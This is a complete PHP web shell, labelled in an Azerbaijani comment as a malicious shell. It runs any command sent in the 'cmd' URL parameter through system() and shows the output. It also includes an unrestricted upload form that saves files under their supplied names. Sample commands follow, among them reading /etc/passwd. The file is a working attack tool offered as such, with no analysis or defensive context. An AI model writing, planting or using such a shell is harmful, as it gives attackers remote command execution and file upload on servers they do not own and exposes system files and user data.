<?php
// Zərərli PHP Shell
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre>";
    system($cmd);
    echo "</pre>";
}

if(isset($_POST['upload'])) {
    if(isset($_FILES['file'])) {
        $file = $_FILES['file'];
        move_uploaded_file($file['tmp_name'], $file['name']);
        echo "Fayl yükləndi: " . $file['name'];
    }
}
?>

<form method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" name="upload" value="Yüklə">
</form>

<p>Command: ?cmd=whoami</p>
<p>Command: ?cmd=ls -la</p>
<p>Command: ?cmd=cat /etc/passwd</p>